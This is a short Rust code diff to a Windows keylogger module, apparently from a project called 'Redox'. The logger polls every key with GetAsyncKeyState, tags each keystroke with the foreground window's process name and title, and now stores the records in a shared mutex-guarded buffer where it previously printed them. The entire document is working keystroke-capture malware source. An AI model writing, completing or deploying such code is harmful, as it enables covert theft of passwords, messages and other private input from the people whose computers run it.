@@ -1,6 +1,7 @@
-use crate::utils::get_current_timestamp;
+use std::sync::Arc;
 use std::thread;
 use std::time::Duration;
+use std::sync::Mutex;
 use winapi::ctypes::c_int;
 use winapi::shared::minwindef::DWORD;
 use winapi::shared::windef::POINT;
@@ -8,15 +9,17 @@ use winapi::um::processthreadsapi::OpenProcess;
 use winapi::um::psapi::GetProcessImageFileNameW;
 use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
 use winapi::um::winuser::*;
+use Redox::schema::key_logger::KeyLoggData;
+use Redox::utils::get_current_timestamp;
 
-pub fn start_logger() {
-    thread::spawn(|| {
+pub fn start_logger(logg: Arc<Mutex<Vec<KeyLoggData>>>) {
+    thread::spawn(move || {
         loop {
-            logger();
+            logger(logg.clone());
         }
     });
 }
-pub fn logger() {
+pub fn logger(logg: Arc<Mutex<Vec<KeyLoggData>>>) {
     thread::sleep(Duration::from_millis(100));
     let hwnd = unsafe { GetForegroundWindow() };
     let pid = unsafe {
@@ -59,7 +62,15 @@ pub fn logger() {
         let key = unsafe { GetAsyncKeyState(i) };
 
         if (key & 1) > 0 {
-            println!("time:{} filename:{} title:{} key:{}", get_current_timestamp(), filename, title, keycode_to_string(i as u8));
+            let x= format!("time:{} filename:{} title:{} key:{}", get_current_timestamp(), filename, title, keycode_to_string(i as u8));
+            let mut log = logg.lock().unwrap();
+            log.push(KeyLoggData {
+                file_name: filename.clone(),
+                title: title.clone(),
+                data: x,
+                timestamp: get_current_timestamp(),
+            });
+            
         }
     }
 }
